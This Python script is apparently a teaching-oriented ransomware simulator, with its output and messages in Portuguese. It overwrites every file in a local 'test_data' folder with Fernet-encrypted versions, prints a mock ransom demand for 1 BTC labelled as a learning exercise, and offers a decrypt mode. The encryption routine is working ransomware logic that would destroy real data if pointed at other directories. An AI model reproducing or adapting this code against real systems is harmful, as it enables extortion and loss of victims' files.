import os
import sys
from cryptography.fernet import Fernet

DATA_DIR = 'test_data'
DECRYPTED_DIR = 'decrypted'
KEY_FILE = 'ransom.key'

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    return key

def load_key():
    with open(KEY_FILE, 'rb') as f:
        return f.read()

def encrypt_files(key):
    f = Fernet(key)
    os.makedirs(DATA_DIR, exist_ok=True)
    for filename in os.listdir(DATA_DIR):
        path = os.path.join(DATA_DIR, filename)
        if os.path.isfile(path):
            with open(path, 'rb') as file:
                original = file.read()
            encrypted = f.encrypt(original)
            with open(path, 'wb') as file:
                file.write(encrypted)
    print("[!] Arquivos criptografados!")
    print("[!] Para descriptografar, use a chave:", key.decode())
    print("[!] Sua chave também está salva em", KEY_FILE)
    print("Mensagem de resgate: Seus arquivos foram sequestrados. Envie 1 BTC (NÃO ENVIE, aprendizado!)")

def decrypt_files(key):
    f = Fernet(key)
    os.makedirs(DECRYPTED_DIR, exist_ok=True)
    for filename in os.listdir(DATA_DIR):
        path = os.path.join(DATA_DIR, filename)
        with open(path, 'rb') as file:
            encrypted = file.read()
        try:
            decrypted = f.decrypt(encrypted)
            dec_path = os.path.join(DECRYPTED_DIR, filename)
            with open(dec_path, 'wb') as file:
                file.write(decrypted)
            print(f"[OK] {filename} descriptografado para {DECRYPTED_DIR}/")
        except Exception as e:
            print(f"[ERRO] Não foi possível descriptografar {filename}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 ransomware_simulado.py [encrypt|decrypt <chave>]")
        sys.exit(1)
    if sys.argv[1] == 'encrypt':
        key = generate_key()
        encrypt_files(key)
    elif sys.argv[1] == 'decrypt':
        if len(sys.argv) < 3:
            print("Uso: python3 ransomware_simulado.py decrypt <chave>")
            sys.exit(1)
        key = sys.argv[2].encode()
        decrypt_files(key)
    else:
        print("Comando desconhecido")
